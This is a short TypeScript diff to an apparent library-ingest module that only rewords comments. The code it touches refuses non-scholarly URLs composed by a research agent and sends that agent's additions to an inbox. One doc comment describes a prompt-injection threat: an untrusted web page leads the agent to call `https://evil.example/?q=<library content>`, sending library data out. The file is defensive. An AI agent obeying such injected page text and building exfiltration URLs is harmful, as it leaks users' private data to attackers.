@@ -59,7 +59,7 @@ function refuseLocalFiles(what: string): never {
 }
 
 /**
- * Refuses an address that a research job composed (W5.1). Such a job reads untrusted web pages, so
+ * Refuses an address that a research job composed. Such a job reads untrusted web pages, so
  * a page could make it pass `https://evil.example/?q=<library content>` and let the core call it.
  * DOIs, arXiv ids, PMIDs, ISBNs, BibTeX and URLs on a scholarly host stay possible.
  */
@@ -93,7 +93,7 @@ export function bindIngestOperations(
         const id = detectIdentifier(input.identifier);
         if (id?.kind === "url" && !isScholarlyUrl(id.value)) refuseOpenAddress(input.identifier);
       }
-      // A research job lands in the inbox, whatever it asks for (D7).
+      // A research job lands in the inbox, whatever it asks for (docs/decisions/0014-agent-content-goes-to-inbox.md).
       return svc.addItem(
         ctx.actor,
         ctx.egress === "scholarly" ? { ...input, target: "inbox" } : input,
